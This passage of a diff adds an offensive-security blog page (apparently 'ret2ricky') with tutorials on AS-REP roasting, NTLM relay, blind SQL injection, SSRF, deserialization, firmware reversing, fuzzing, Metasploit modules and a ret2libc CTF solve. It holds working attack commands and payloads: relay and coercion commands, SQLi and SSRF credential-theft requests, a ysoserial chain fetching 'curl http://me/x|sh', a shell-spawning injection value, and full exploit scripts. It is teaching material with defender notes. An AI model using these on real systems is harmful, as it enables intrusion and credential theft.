+<span class="cm"># If you already have any domain creds, enumerate the flag directly</span>
+GetNPUsers.py corp.local/lowpriv:Password1 -request</code></pre>
+
+<h3>Where the usernames come from</h3>
+<p>The only prerequisite is a list of valid usernames, and there are many quiet ways to build one: OSINT on LinkedIn mapped to the org's naming convention (<code>first.last</code>, <code>flast</code>), a prior breach dump, user enumeration via Kerberos (valid-vs-invalid usernames return different KDC errors), or a null/guest session against the DC.</p>
+<pre><code>$ hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule</code></pre>
+
+<p>Pair it with Kerberoasting in your methodology and you cover both phases cheaply: AS-REP roast to try for an <em>initial</em> credential with no foothold, then Kerberoast once you are authenticated to escalate. Two low-noise techniques that together bracket the whole access lifecycle.</p>
+
+<p class="callout"><strong>Defender moves:</strong> audit for <code>DONT_REQ_PREAUTH</code> across all accounts (<code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code>), remove it wherever the legacy reason no longer holds, and give any account that genuinely needs it a long random password.</p>
+</article>
+
+<article data-slug="ntlm-relay" data-title="NTLM Relay Without the Hype" data-date="2026-03-16" data-tags="active-directory,network" data-excerpt="You don't need to crack a hash if you can just relay the authentication somewhere useful. Coercion plus relay — to LDAP, to AD CS — is still one of the most devastating internal techniques.">
+<p>NTLM relay is widely demoed and widely misunderstood. The core idea is simple: when a victim authenticates to <em>me</em>, I do not try to crack their hash &mdash; I forward (relay) that authentication, live, to a third service that accepts it, and act as the victim there. NTLM has no binding between the authentication and the channel it travels over, which is the flaw the whole technique exploits.</p>
+
+<h3>Two halves: coercion and relay</h3>
+<p><strong>Coercion</strong> makes a victim authenticate to you. Machine accounts can be forced to connect to an arbitrary host through RPC methods like PetitPotam (MS-EFSRPC) or the printer bug (MS-RPRN). <strong>Relay</strong> forwards that incoming authentication to a target that does not enforce signing.</p>
+<pre><code><span class="cm"># Terminal 1: stand up the relay, aimed at LDAP on the DC</span>
+ntlmrelayx.py -t ldaps://dc.corp.local --delegate-access -smb2support
+
+<span class="cm"># Terminal 2: coerce a privileged machine to authenticate to us</span>
+PetitPotam.py -u lowpriv -p Password1 -d corp.local &lt;attacker_ip&gt; dc.corp.local</code></pre>
+
+<h3>Where it leads</h3>
+<p>The target of the relay determines the impact:</p>
+<ul>
+<li><strong>Relay to LDAP</strong> with <code>--delegate-access</code> configures resource-based constrained delegation (RBCD) on the victim machine object, letting you impersonate any user &mdash; including a Domain Admin &mdash; onto that host.</li>
+<li><strong>Relay to AD CS web enrollment (ESC8)</strong> lets you request a certificate <em>as</em> the coerced machine or user. A domain controller's certificate is effectively a golden key: you can then authenticate as the DC via PKINIT and dump the domain.</li>
+<li><strong>Relay to SMB</strong> on a host where the victim is a local admin gives direct command execution.</li>
+</ul>
+<pre><code><span class="cm"># ESC8: relay coerced DC auth to the CA's web enrollment, get a cert</span>
+ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></pre>
+
+<blockquote>The relentless theme of internal AD work: identity is the perimeter, and signing is the control that keeps a coerced connection from turning into a domain takeover.</blockquote>
+
+<p class="callout"><strong>Defender moves:</strong> enforce SMB signing and LDAP signing + channel binding; enable Extended Protection for Authentication (EPA) on AD CS web endpoints; disable NTLM where you can; and patch the coercion vectors. Any one of these breaks a specific relay path; together they close the technique.</p>
+</article>
+
+<article data-slug="sqli-deep-dive" data-title="SQL Injection: Beyond &#39; OR 1=1" data-date="2026-02-24" data-tags="web,fundamentals" data-excerpt="Everyone knows the login-bypass payload. The engagement-relevant skill is blind, time-based extraction when there's no error and no output — and knowing enough context to tune the tooling instead of spraying it.">
+<p>The tutorial version of SQL injection returns an error or dumps a table. The real-world version is usually <strong>blind</strong>: the application behaves identically whether your injection is true or false, and never echoes data back. You extract information one bit at a time by asking yes/no questions and reading the response &mdash; its content, or just its <em>timing</em>.</p>
+
+<h3>Fingerprinting the context first</h3>
+<p>Before extraction, you confirm the injection and learn its context, because the context dictates every payload after it: is the parameter numeric or wrapped in quotes, what is the quote style, is it inside a <code>LIKE</code>, how many columns does the query return, and which DBMS is it? A few manual probes answer this faster than any tool:</p>
+<pre><code>id=1            -&gt; normal
+id=1'           -&gt; error or different behavior  (string context, single-quote)
+id=1' AND '1'='1 -&gt; normal                      (confirms injection + quote close)
+id=1' AND '1'='2 -&gt; different                   (boolean works)
+id=1' ORDER BY 5-- -&gt; error at N+1 columns      (column count)</code></pre>
+
+<h3>Boolean to time-based blind</h3>
+<p>When the app shows a visible true/false difference, you read data by asking boolean questions. When it shows <em>nothing</em> &mdash; same page every time &mdash; you fall back to timing: make a "true" answer sleep and a "false" answer return instantly.</p>
+<pre><code>-- Postgres: is the first char of the admin's hash 'a'?
+'; SELECT CASE
+     WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a')
+     THEN pg_sleep(3) ELSE pg_sleep(0) END--</code></pre>
+<p>A three-second response means the guess was right. Binary-search the character value (is it &lt; 'm'? &lt; 't'?) to cut guesses from 95 to about 7 per character, loop over every position, and you reconstruct the whole field &mdash; slowly, but reliably, with latency as your only oracle.</p>
+
+<h3>In practice</h3>
+<p>Nobody does this by hand past the proof of concept. I confirm and fingerprint manually, then hand extraction to <code>sqlmap</code> with the context I already know &mdash; which is the difference between a tool that works and a tool that flails:</p>
+<pre><code>$ sqlmap -u "https://app/item?id=1" -p id \
+    --dbms=postgresql --technique=T --time-sec=2 \
+    --tamper=space2comment --batch --dump -T users</code></pre>
+
+<p class="callout"><strong>What impresses a client</strong> is not "I ran sqlmap." It is "here is the exact query context, why parameterization is missing on this one endpoint, what an attacker extracts, and the one-line prepared-statement fix." The tool finds the data; your understanding writes the finding.</p>
+</article>
+
+<article data-slug="ssrf-server-side-request-forgery" data-title="SSRF: Making the Server Fetch What It Shouldn&#39;t" data-date="2026-02-03" data-tags="web,cloud" data-excerpt="Server-side request forgery turns a web app into your proxy into the internal network — and, in the cloud, into the metadata service that hands out credentials. Plus the filter bypasses that defeat naive allowlists.">
+<p>SSRF is a web bug with network-level consequences. If an application fetches a URL you control &mdash; a fetch-image-from-URL feature, a webhook sender, a PDF/screenshot renderer, an XML parser with external entities &mdash; you can often point it at resources <em>it</em> can reach but <em>you</em> cannot. The app becomes your request proxy into places the firewall was supposed to protect.</p>
+
+<h3>The cloud escalation</h3>
+<p>The highest-impact SSRF target is the cloud instance metadata service at <code>169.254.169.254</code>. A server tricked into fetching your URL can be told to fetch its own IAM credentials:</p>
+<pre><code>POST /api/fetch
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+-&gt; S3Access-Role
+
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Access-Role
+-&gt; { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }</code></pre>
+<p>Those temporary keys frequently carry far more access than the web app itself needs. IMDSv2 mitigates this by requiring a <code>PUT</code> to obtain a token header first, which a naive GET-only SSRF cannot supply &mdash; so one of the first things worth checking on a cloud target is whether it is still on IMDSv1.</p>
+
+<h3>Internal pivoting and filter bypasses</h3>
+<p>Even without cloud, SSRF lets you port-scan the internal network through the app (watch response times and error differences), reach admin panels bound to <code>localhost</code> that assume anyone who can connect is trusted, and hit internal-only APIs. Allowlists that block obvious targets usually fall to encoding tricks:</p>
+<div class="tablewrap"><table>
+<tr><th>Blocked</th><th>Bypass</th></tr>
+<tr><td><code>127.0.0.1</code></td><td><code>[::1]</code>, <code>2130706433</code> (decimal), <code>0x7f.0.0.1</code>, <code>127.1</code></td></tr>
+<tr><td>metadata IP literal</td><td>a DNS name you control that resolves to it</td></tr>
+<tr><td>host allowlist</td><td><code>http://allowed.com@169.254.169.254/</code>, or an open redirect on <code>allowed.com</code></td></tr>
+<tr><td>IP checked once</td><td>DNS rebinding: pass the check, then re-resolve to the internal IP</td></tr>
+</table></div>
+
+<p class="callout"><strong>Defender moves:</strong> enforce IMDSv2, deny egress from app servers by default and allowlist only required destinations, validate URLs after DNS resolution (not just the string), and block link-local and private ranges at the network layer rather than in application code.</p>
+</article>
+
+<article data-slug="insecure-deserialization" data-title="Insecure Deserialization: Objects as Attack Payloads" data-date="2026-01-13" data-tags="web,exploit-dev" data-excerpt="When an app rebuilds objects from untrusted bytes, you can sometimes rebuild a shell instead. How gadget chains work in Java and .NET, how to spot serialized blobs on the wire, and why the fix is structural.">
+<p>Deserialization turns a byte stream back into live objects. The danger appears when those bytes are attacker-controlled <em>and</em> the language's deserializer runs code during reconstruction &mdash; constructors, setters, callbacks like Java's <code>readObject</code> or magic methods. An attacker crafts input that chains together methods from classes already on the classpath (a "gadget chain") until those calls add up to command execution.</p>
+
+<h3>Spotting it on the wire</h3>
+<p>Serialized blobs have recognizable fingerprints. Any of these arriving from a cookie, hidden field, header, or API body deserves a hard look:</p>
+<div class="tablewrap"><table>
+<tr><th>Platform</th><th>Fingerprint</th></tr>
+<tr><td>Java</td><td>magic bytes <code>AC ED 00 05</code>, or <code>rO0</code> in base64</td></tr>
+<tr><td>.NET</td><td><code>BinaryFormatter</code> / <code>ObjectStateFormatter</code> blobs; ViewState</td></tr>
+<tr><td>Python</td><td><code>pickle</code> opcodes; often base64 in a cookie</td></tr>
+<tr><td>PHP</td><td><code>O:8:"ClassName":...</code> serialized strings</td></tr>
+</table></div>
+
+<h3>Building the chain</h3>
+<p>You rarely write gadget chains by hand &mdash; the research community has catalogued reusable ones in common libraries. The point is that the vulnerable application code looks harmless (it just deserializes a session object); the exploit lives entirely in libraries the app already ships.</p>
+<pre><code><span class="cm"># Java: generate a gadget chain for a known-vulnerable library</span>
+java -jar ysoserial.jar CommonsCollections6 'curl http://me/x|sh' | base64
+
+<span class="cm"># .NET: ysoserial.net for BinaryFormatter sinks</span>
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami"</code></pre>
+<p>Match the gadget to what is actually on the classpath &mdash; <code>CommonsCollections6</code> only works if a compatible Apache Commons Collections is present. Half the work is fingerprinting dependencies (error messages, JS bundles, timing) to pick a chain that will fire.</p>
+
+<p class="callout"><strong>Why the fix is structural:</strong> you cannot "sanitize" your way out of deserialization RCE, because the dangerous behavior is in trusted library code, not in your input parsing. Remove native deserialization of untrusted data, enforce allowlisted type binders (<code>ObjectInputFilter</code> in Java), or switch to a data-only format like JSON with polymorphic type handling disabled.</p>
+</article>
+
+<article data-slug="ghidra-firmware-workflow" data-title="A Practical Ghidra Workflow for Firmware" data-date="2025-12-09" data-tags="reverse-engineering,firmware" data-excerpt="Opening an unknown binary in Ghidra is intimidating. Here's the repeatable loop I use to go from an opaque firmware blob to understood code, without reading everything.">
+<p>Open Ghidra for the first time, stare at a wall of <code>FUN_00401a30</code>, and it is easy to freeze. Reverse engineering is not about reading everything &mdash; it is about narrowing fast to the code that matters and testing hypotheses against it. Here is the loop I actually run on firmware.</p>
+
+<h3>Extract before you analyze</h3>
+<p>Firmware images are usually a bootloader, a kernel, and a packed filesystem glued together. Carve them apart first so you analyze real binaries instead of a blob:</p>
+<pre><code>$ binwalk firmware.bin                 <span class="cm"># identify the layout and offsets</span>
+$ binwalk -e firmware.bin              <span class="cm"># extract the filesystem</span>
+$ ls _firmware.bin.extracted/squashfs-root/
+bin  etc  lib  sbin  usr  www
+$ file .../squashfs-root/usr/sbin/httpd
+ELF 32-bit LSB executable, ARM, dynamically linked   <span class="cm"># this is our target</span></code></pre>
+
+<h3>Anchor on strings, pivot to code</h3>
+<p>Ghidra's Defined Strings window is the fastest map of an unknown binary. Error messages, format strings, config paths, and command templates tell you what a function does before you read a single instruction. The loop:</p>
+<ol>
+<li>Open the target, let auto-analysis finish, then open <strong>Window &rarr; Defined Strings</strong>.</li>
+<li>Find a string that smells interesting &mdash; <code>"system"</code>, <code>"/bin/"</code>, <code>"%s %s"</code>, a diagnostic page name.</li>
+<li>Double-click it, then use <strong>References &rarr; Show References to Address</strong> to jump into the function that uses it.</li>
+<li>Rename that function immediately, and rename every variable you understand. The decompiler output becomes readable in proportion to how much you have annotated.</li>
+</ol>
+
+<h3>Hunt the bug class, not the whole program</h3>
+<p>On a router or IoT device, command injection in the web interface is the usual payday. So I do not read linearly &mdash; I form a hypothesis ("the <code>ping</code> diagnostic page probably passes the host straight to <code>system</code>") and chase it through the strings:</p>
+<pre><code><span class="cm">// what the decompiler often reveals after a few renames:</span>
+iVar1 = get_cgi_param(req, "host", host_buf);
+sprintf(cmd_buf, "ping -c 4 %s", host_buf);   <span class="cm">// host_buf is attacker-controlled</span>
+system(cmd_buf);                              <span class="cm">// -&gt; injection: host=8.8.8.8;telnetd -l/bin/sh</span></code></pre>
+<p>Strings got me from "opaque ARM binary" to "command injection in the ping handler" in minutes. Reading the whole thing would have taken days and found the same bug.</p>
+
+<p class="callout"><strong>Mindset shift:</strong> you are not decompiling a program top to bottom. You are testing hypotheses about where a specific bug class lives, and using strings and cross-references as the fastest route to each candidate.</p>
+</article>
+
+<article data-slug="fuzzing-with-aflpp" data-title="Finding Crashes Fast With AFL++" data-date="2025-11-11" data-tags="fuzzing,exploit-dev" data-excerpt="You don't have to be smarter than the developer — you have to generate inputs faster than they tested. Coverage-guided fuzzing, from instrumentation to triage, plus the sanitizer step that turns crashes into root causes.">
+<p>Fuzzing is the laziest high-yield bug-finding technique there is, and I mean that as a compliment. You feed a program mutated garbage, watch for crashes, and let coverage feedback steer the mutations toward unexplored code paths. AFL++ makes this nearly turnkey for anything that parses a file, a buffer, or a protocol message.</p>
+
+<h3>Coverage feedback is the whole trick</h3>
+<p>Dumb fuzzing (random bytes) rarely gets past the first length check. AFL++ instruments the target at compile time so it can see which code paths each input reaches. When a mutated input hits <em>new</em> coverage, it is kept and mutated further; inputs that explore nothing are discarded. Over time the corpus evolves toward inputs that reach deep, rarely tested code &mdash; which is exactly where bugs hide.</p>
+
+<h3>The three steps</h3>
+<pre><code><span class="cm"># 1. Compile with instrumentation</span>
+$ CC=afl-cc CXX=afl-c++ ./configure &amp;&amp; make
+
+<span class="cm"># 2. Seed with a few small, valid inputs (quality of seeds matters a lot)</span>
+$ mkdir in &amp;&amp; cp samples/tiny.jpg in/
+
+<span class="cm"># 3. Fuzz — @@ is replaced with each input file path</span>
+$ afl-fuzz -i in -o out -- ./target @@</code></pre>
+<p>Leave it running &mdash; ideally overnight, ideally many parallel instances (one <code>-M</code> main, several <code>-S</code> secondaries). Watch the UI: <em>paths</em> climbing means coverage is still growing; <em>saved crashes</em> climbing means you have work to triage. Inputs that crash land in <code>out/default/crashes/</code>.</p>
+
+<h3>Triage is the real work</h3>
+<p>A crash is not a vulnerability yet &mdash; it is a lead. Rebuild the target with AddressSanitizer and replay each crashing input to get a precise root-cause report: what kind of memory error, in which function, at which line.</p>
+<pre><code>$ CC=afl-cc CFLAGS="-fsanitize=address -g" make        <span class="cm"># ASan build</span>
+$ ./target_asan out/default/crashes/id:000003,sig:11,...
+==12345==ERROR: AddressSanitizer: heap-buffer-overflow
+    WRITE of size 8 at 0x60200000eff8
+    #0 parse_header chunk.c:214                          <span class="cm"># root cause, exactly</span></code></pre>
+<p>ASan tells you it is a heap overflow and where; a plain GDB run tells you whether you control the instruction pointer. Deduplicate crashes by stack hash before you start &mdash; a thousand "unique" crash files are often three real bugs.</p>
+
+<p class="callout"><strong>Workflow tip:</strong> start fuzzing on day one of any assessment that includes a custom parser or file format. It runs unattended while you do everything else, and you come back to a folder of leads.</p>
+</article>
+
+<article data-slug="first-metasploit-module" data-title="Writing Your First Metasploit Module" data-date="2025-10-14" data-tags="exploit-dev,tooling" data-excerpt="Turning a working proof-of-concept into a reusable module forces you to separate the exploit's logic from its hardcoded assumptions — which is where real understanding lives.">
+<p>A standalone exploit script is fine for a one-off. Porting it into a Metasploit module does two things: it makes the exploit reusable across engagements and payloads, and it forces you to separate the exploit's <em>logic</em> from its hardcoded assumptions &mdash; the offset, the return address, the target version. That separation is the best code review your exploit will ever get.</p>
+
+<h3>Anatomy of a remote exploit module</h3>
+<p>Metasploit modules are Ruby classes that mix in the capabilities they need. A remote stack-overflow module typically includes the TCP client mixin and declares its targets, each with its own version-specific constants.</p>
+<pre><code>class MetasploitModule &lt; Msf::Exploit::Remote
+  Rank = NormalRanking
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        =&gt; 'Example Service Stack Overflow',
+      'Description'  =&gt; 'SEH overflow in Example Service &lt;= 1.2',
+      'Platform'     =&gt; 'win',
+      'Targets'      =&gt; [
+        [ 'Example v1.0', { 'Ret' =&gt; 0x10015b4a, 'Offset' =&gt; 520 } ],
+        [ 'Example v1.2', { 'Ret' =&gt; 0x100174c2, 'Offset' =&gt; 536 } ]
+      ],
+      'DefaultTarget' =&gt; 0))
+    register_options([ Opt::RPORT(9999) ])
+  end
+
+  def exploit
+    connect
+    sploit  = rand_text_alpha(target['Offset'])
+    sploit &lt;&lt; [target.ret].pack('V')     <span class="cm"># version-specific return address</span>
+    sploit &lt;&lt; payload.encoded            <span class="cm"># operator-chosen payload, not hardcoded</span>
+    sock.put(sploit)
+    handler                             <span class="cm"># catch the shell</span>
+    disconnect
+  end
+end</code></pre>
+
+<h3>Why this makes you better</h3>
+<p>The <code>Targets</code> array is the payoff and the lesson. In a one-off script, the offset and return address are magic numbers buried in the code. Here they are named, per-target data &mdash; which forces you to articulate <em>exactly</em> what changes between software versions and why. And because <code>payload.encoded</code> replaces your hardcoded shellcode, the framework's encoders handle bad characters and the operator picks the payload at runtime, so your exploit is suddenly useful against targets and in situations you never anticipated.</p>
+
+<p class="callout"><strong>Try it:</strong> take any working PoC you have and port it. The act of filling in the module metadata &mdash; platform, targets, options &mdash; surfaces every assumption you baked in without noticing.</p>
+</article>
+
+<article data-slug="assumed-breach-mindset" data-title="The Assumed-Breach Mindset" data-date="2025-09-02" data-tags="methodology,red-team" data-excerpt="Perimeter-only testing answers a question attackers stopped asking years ago. Why starting inside — as an already-compromised user — finds more and tests the defenders, not just the firewall.">
+<p>Traditional external pentests spend most of their budget on the perimeter: can I get in? But capable attackers assume they <em>will</em> get in &mdash; through a phish, a reused credential, a vulnerable third party, a lost laptop &mdash; and the interesting question becomes what happens next. Assumed-breach testing starts you inside, as a compromised standard domain user, and measures how far that single foothold goes.</p>
+
+<h3>Why it finds more</h3>
+<p>Given one low-privileged foothold, the internal attack surface is enormous, and almost none of it is reachable from the perimeter:</p>
+<ul>
+<li>Kerberoastable and AS-REP-roastable accounts with weak passwords.</li>
+<li>Credentials sitting in SYSVOL, GPO preferences, and scripts.</li>
+<li>Local admin password reuse across workstations (no LAPS).</li>
+<li>Over-permissioned shares and ACLs that allow lateral movement or privilege escalation.</li>
+<li>Unconstrained and resource-based constrained delegation.</li>
+<li>AD CS misconfigurations (the ESC1&ndash;ESC8 family).</li>
+</ul>
+<p>A perimeter-focused test that spends two weeks failing to breach the firewall reports "strong external posture" and never touches any of this. An assumed-breach test reaches all of it in the first few days, because it starts where the budget actually matters.</p>
+
+<blockquote>The maturity question is not "can you keep attackers out?" It is "when one gets in as a normal user, how long until they own the domain &mdash; and would you even see it happen?"</blockquote>
+
+<h3>It tests the defenders, not just the config</h3>
+<p>Starting inside means every action is a chance for the blue team to detect it. Run as a purple-team exercise &mdash; attacker and defender in the same room, or at least the same Slack channel &mdash; and assumed breach becomes a detection-engineering feedback loop: I run a technique, we check whether it alerted, we tune the rule or build the missing one, we move on. A report that says "Kerberoasting succeeded and generated no alert" is worth far more to most organizations than another report confirming the firewall blocks inbound SMB.</p>
+
+<p class="callout"><strong>Scoping note:</strong> define the starting foothold explicitly (which user, which host, what access) and the goals (Domain Admin? a specific crown-jewel dataset?). "Assumed breach" without a defined start and objective drifts into an unfocused crawl.</p>
+</article>
+
+<article data-slug="pentest-reporting" data-title="Writing Pentest Reports Executives Actually Read" data-date="2025-07-15" data-tags="methodology,reporting" data-excerpt="The exploit is half the job. A finding nobody understands or prioritizes is a finding that never gets fixed. Two audiences, one document, and the anatomy of a finding that drives action.">
+<p>I have watched brilliant technical work die in a PDF nobody acted on. The deliverable is not proof that you are clever &mdash; it is a document that causes the right things to get fixed, in the right order, by people who were not in the room when you found them. That is a writing problem as much as a hacking one, and it is the part most testers undertrain.</p>
+
+<h3>Two audiences, one report</h3>
+<p>A good report serves two readers who never read the same pages. The <strong>executive summary</strong> answers three questions in plain business language: what is the risk, how bad is it, and what should we do first. No CVE numbers, no tool output &mdash; a CFO should finish it understanding the stakes and the priorities. The <strong>technical findings</strong> behind it give engineers full reproduction steps, evidence, and remediation precise enough to act on without calling you.</p>
+
+<h3>Anatomy of a finding that drives action</h3>
+<p>Every finding gets the same shape, and the order matters:</p>
+<ol>
+<li><strong>Impact first.</strong> Lead with what an attacker <em>achieves</em> &mdash; "full domain compromise from an unauthenticated position" &mdash; not the mechanism. The reader decides how much to care in the first sentence.</li>
+<li><strong>Reproducible.</strong> Exact requests, exact commands, exact preconditions. If an engineer cannot reproduce it, they will quietly deprioritize it and you will never know.</li>
+<li><strong>Evidence.</strong> A screenshot or capture that proves the impact, not just the vulnerability &mdash; the shell, the dumped record, the admin session.</li>
+<li><strong>Actionable fix.</strong> Not "patch your systems." The specific configuration change or code fix, with the trade-offs named, so nobody has to go research what you already know.</li>
+<li><strong>Honest severity.</strong> Rate it against real exploitability and business impact. Inflating everything to Critical trains the client to ignore your ratings, which devalues the genuinely critical findings.</li>
+</ol>
+
+<h3>Severity is a conversation, not a CVSS number</h3>
+<p>CVSS is a starting point, not the answer. A "medium" information disclosure that leaks the exact detail needed to exploit a separate "medium" write primitive is, together, a critical chain &mdash; and your report should say so explicitly, linking the two findings. The value you add over a scanner is precisely this: reasoning about how individually unremarkable issues combine into real risk.</p>
+
+<p class="callout"><strong>The report is the product.</strong> The access was temporary; the document is what the client keeps, budgets against, and hands to their engineers. Write it like the deliverable it is.</p>
+</article>
+
+<article data-slug="ctf-ret2libc-writeup" data-title="CTF Writeup: A 64-bit ret2libc, Start to Finish" data-date="2025-05-19" data-tags="ctf,exploit-dev,binary" data-excerpt="A complete pwn solve tying the whole exploit-dev series together — the overflow, the leak, and the ROP chain — on one real challenge binary, with the full pwntools script.">
+<p>This pulls the whole exploit-development series together on a single challenge: a 64-bit ELF, NX on, PIE off, ASLR on, no stack canary. There is no <code>win</code> function and no <code>system</code> call anywhere in the binary &mdash; classic ret2libc territory, where you leak libc's base and borrow <code>system</code> from the library itself.</p>
+
+<h3>Recon</h3>
+<pre><code>$ checksec ./chall
+RELRO: Partial | Canary: No | NX: enabled | PIE: No PIE
+$ file ./chall
+ELF 64-bit LSB executable, x86-64, dynamically linked</code></pre>
+<p>Read that like a checklist. <strong>No canary</strong> + <strong>No PIE</strong> means a clean stack overflow with static gadget and PLT/GOT addresses &mdash; no leak needed to find <em>the binary's own</em> code. <strong>NX</strong> means no stack shellcode, so ROP. <strong>ASLR on libc</strong> means I still need one leak to locate <code>system</code>. So: a two-stage ret2libc, exactly the structure from the ASLR/DEP post.</p>
+
+<h3>Find the offset</h3>
+<pre><code>$ cyclic 120 | ./chall          <span class="cm"># crash it</span>
+$ dmesg | tail -1               <span class="cm"># or read rsp in gdb</span>
+$ cyclic -l 0x6161617461616173  <span class="cm"># -&gt; 72</span></code></pre>
+
+<h3>Stage 1 &mdash; leak libc</h3>
+<p>ROP a call to <code>puts(puts@got)</code> to print libc's resolved <code>puts</code> address, then return into <code>main</code> to run the vulnerable path a second time with libc located.</p>
+<pre><code>from pwn import *
+elf  = ELF("./chall"); libc = ELF("./libc.so.6")
+p = elf.process()
+rop = ROP(elf)
+
+payload  = b"A"*72
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(elf.got['puts'])      <span class="cm"># arg = &amp;puts@GOT</span>
+payload += p64(elf.plt['puts'])      <span class="cm"># leak it</span>
+payload += p64(elf.sym['main'])      <span class="cm"># round two</span>
+p.sendlineafter(b'&gt; ', payload)
+
+leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leak - libc.sym['puts']
+log.success('libc base: %#x', libc.address)</code></pre>
+
+<h3>Stage 2 &mdash; pop a shell</h3>
+<pre><code>pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret     = rop.find_gadget(['ret'])[0]          <span class="cm"># movaps alignment</span>
+
+payload  = b"A"*72
+payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
+payload += p64(ret)
+payload += p64(libc.sym['system'])
+p.sendlineafter(b'&gt; ', payload)
+p.interactive()                                <span class="cm"># $ id; cat flag.txt -&gt; flag{...}</span></code></pre>
+
+<p>Every piece here appeared in an earlier post &mdash; the cyclic offset, the leak-then-exploit structure, the <code>pop rdi</code> gadget, the <code>movaps</code> alignment <code>ret</code>. That is the entire point of the series: real exploits are these fundamentals, composed. Learn each one in isolation on a toy binary, then chain them, and a "hard" pwn challenge becomes a sequence of familiar moves.</p>
+</article>
+
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  var root = document.documentElement;
+  var toggle = document.getElementById("themeToggle");
+
+  // Dark is the default. Only an explicit stored choice changes it.
+  function stored() {
+    try { return localStorage.getItem("ret2ricky-theme"); } catch (e) { return null; }
+  }
+  (function applyStored() {
+    var t = stored();
+    if (t === "light" || t === "dark") root.setAttribute("data-theme", t);
+    // no attribute => bare :root => dark default
+  })();
+  function currentTheme() {
+    return root.getAttribute("data-theme") || "dark";
+  }
+  if (toggle) {
+    toggle.addEventListener("click", function () {
+      var next = currentTheme() === "dark" ? "light" : "dark";
+      root.setAttribute("data-theme", next);
+      try { localStorage.setItem("ret2ricky-theme", next); } catch (e) {}
+    });
+  }
+
+  var nodes = Array.prototype.slice.call(document.querySelectorAll("#store > article"));
+  var posts = nodes.map(function (n) {
+    return {
+      slug: n.getAttribute("data-slug"),
+      title: n.getAttribute("data-title"),
+      date: n.getAttribute("data-date"),
+      tags: (n.getAttribute("data-tags") || "").split(",").map(function (s) { return s.trim(); }).filter(Boolean),
+      excerpt: n.getAttribute("data-excerpt") || "",
+      html: n.innerHTML
+    };
+  }).sort(function (a, b) { return a.date < b.date ? 1 : a.date > b.date ? -1 : 0; });
+
+  var bySlug = {};
+  posts.forEach(function (p) { bySlug[p.slug] = p; });
+
+  var MONTHS = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+  function fmtDate(iso) {
+    var pr = iso.split("-");
+    return MONTHS[parseInt(pr[1], 10) - 1] + " " + parseInt(pr[2], 10) + ", " + pr[0];
+  }
+
+  var allTags = [];
+  posts.forEach(function (p) { p.tags.forEach(function (t) { if (allTags.indexOf(t) === -1) allTags.push(t); }); });
+  allTags.sort();
+  var activeTag = null;
+  var filterbar = document.getElementById("filterbar");
+
+  function renderFilter() {
+    filterbar.innerHTML = "";
+    var mk = function (label, val) {
+      var b = document.createElement("button");
+      b.className = "tag"; b.type = "button";
+      b.textContent = val ? "#" + label : label;
+      b.setAttribute("aria-pressed", String(activeTag === val));
+      b.addEventListener("click", function () {
+        activeTag = (activeTag === val) ? null : val;
+        renderFilter(); renderList();
+      });
+      filterbar.appendChild(b);
+    };
+    mk("all", null);
+    allTags.forEach(function (t) { mk(t, t); });
+  }
+
+  var postlist = document.getElementById("postlist");
+  function renderList() {
+    postlist.innerHTML = "";
+    posts.filter(function (p) { return !activeTag || p.tags.indexOf(activeTag) !== -1; })
+      .forEach(function (p) {
+        var a = document.createElement("a");
+        a.className = "entry"; a.href = "#" + p.slug;
+        a.innerHTML =
+          '<div class="date">' + fmtDate(p.date) + '</div>' +
+          '<div><h2>' + p.title + '</h2>' +
+          '<p class="excerpt">' + p.excerpt + '</p>' +
+          '<div class="tags">' + p.tags.map(function (t) { return "<span>" + t + "</span>"; }).join("") + '</div>' +
+          '</div>';
+        postlist.appendChild(a);
+      });
+  }
+
+  var indexview = document.getElementById("indexview");
+  var postview = document.getElementById("postview");
+  var pvTitle = document.getElementById("pvTitle");
+  var pvMeta = document.getElementById("pvMeta");
+  var pvBody = document.getElementById("pvBody");
+
+  function showPost(p) {
+    pvTitle.textContent = p.title;
+    pvMeta.innerHTML =
+      '<span>' + fmtDate(p.date) + '</span>' +
+      '<span>' + p.tags.map(function (t) { return "#" + t; }).join(" ") + '</span>';
+    pvBody.innerHTML = p.html;
+    indexview.style.display = "none";
+    postview.style.display = "block";
+    window.scrollTo(0, 0);
+  }
+  function showIndex() {
+    postview.style.display = "none";
+    indexview.style.display = "block";
+  }
+  function route() {
+    var h = (location.hash || "").replace(/^#/, "");
+    if (h && bySlug[h]) showPost(bySlug[h]);
+    else showIndex();
+  }
+
+  window.addEventListener("hashchange", route);
+  renderFilter();
+  renderList();
+  route();
+})();
+</script>
